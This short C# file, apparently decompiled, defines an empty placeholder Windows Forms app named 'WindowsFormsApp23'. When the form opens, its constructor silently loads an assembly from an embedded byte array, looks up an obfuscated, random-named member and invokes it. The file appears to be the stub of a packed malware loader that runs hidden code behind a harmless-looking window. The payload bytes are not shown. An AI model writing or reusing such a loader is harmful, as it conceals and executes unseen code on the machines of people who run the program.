using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

namespace WindowsFormsApp23;

public class Form1 : Form
{
	private IContainer components;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
	}

	public Form1()
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		Assembly assembly = Assembly.Load(Cook.Array());
		Delegate @delegate = Delegate.CreateDelegate(typeof(Action), (MethodInfo)assembly.GetExportedTypes()[0].GetMember("Krykbatklcocyijlyvg")[0]);
		MessageBox.Show((string)@delegate.DynamicInvoke());
	}
}
